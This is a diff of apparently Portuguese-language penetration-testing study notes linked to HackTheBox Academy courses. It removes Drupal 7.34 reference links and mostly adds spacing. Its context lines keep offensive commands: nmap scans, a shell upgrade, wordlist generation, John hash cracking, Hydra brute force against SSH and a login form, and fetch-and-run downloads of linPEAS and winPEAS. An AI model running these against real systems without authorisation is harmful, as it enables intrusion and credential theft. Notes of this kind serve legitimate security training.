@@ -30,18 +30,6 @@ https://academy.hackthebox.com/module/113/section/1089
 COURSE ATTACKING ENTERPRISE NETWORKS
 https://academy.hackthebox.com/module/163/section/1544
 
-## DRUPAL
-
-CMS Drupal v7.34
-http://ftp.drupal.org/files/projects/drupal-7.34.tar.gz
-https://www.drupal.org/blog/drupal-734-and-634-released
-https://www.tenable.com/plugins/nessus/79386
-https://www.acunetix.com/vulnerabilities/web/drupal-core-7-x-multiple-vulnerabilities-7-0-7-34/
-https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2015-03-18/drupal-core-moderately-critical
-
-
-Como instalar o drupal
-https://www.drupal.org/docs/7/install
 
 
 ## CMS
@@ -79,11 +67,15 @@ nmap -sVC -A -p- -T5
 nmap -Pn -sS -sV -p- -iL hosts
 
 **Separando somente os endereços IP**
+
 Comando: `grep "Up" ativos.txt | cut -d " " -f 2 > hosts`
+
 **Encontrando alvos com porta 80**
+
 Comando: `nmap -sSV -p 80 --open -Pn -iL hosts -oG web.txt`
 
 **Scan Completo**
+
 `nmap -Pn -sC -sV -p- -iL enum/alvos.txt -oA servicos/full`
 
 
@@ -92,18 +84,23 @@ Comando: `nmap -sSV -p 80 --open -Pn -iL hosts -oG web.txt`
 ### Compilando binários
 
 **Compilando em 32 bits**
+
 Comando: `apt-get update`
+
 Comando: `apt-get install gcc-multilib g++-multilib`
 
 **Melhorando a shell**
+
 python -c 'import pty;pty.spawn("/bin/bash");'
 
 ### Ataques a Senhas
 
 **Descompactando a wordlist rockyou.txt**
+
 Comando: `gunzip /usr/share/wordlists/rockyou.txt.gz`
 
 **Gerando senhas a partir do site**
+
 Comando: `cewl -d 2 -m 5 www.certifiedhacker.com -u "Firefox 5.1" -w /tmp/dicionario.txt`
 
 cewl -d -w save_wordlist.txt 2 -m 5 www.example.com
@@ -119,12 +116,15 @@ cewl -d -w save_wordlist.txt 2 -m 5 www.example.com
 https://github.com/danielmiessler/SecLists
 
 **Quebrando a hash**
+
 Comando: `john SMB-NTLMv2-SSP-10.10.1.11.txt --wordlist /usr/share/wordlists/rockyou.txt`
 
 **Bruteforce em protocolos**
+
 Commando: `hydra -L users.txt -p Password ssh://192.168.200.1`
 
 **Bruteforce em campos de login**
+
 Command: `hydra -v -L users.tt -P pass.txt 192.168.200.1 http-post-form "/diretorio/login.php:login=ÛSER^&senha=^PASS^&Login:incorreto`
 
 
@@ -201,6 +201,7 @@ https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 Comando: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 
 **WinPEAS**
+
 Comando: `powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"`
 
 ## Exploração
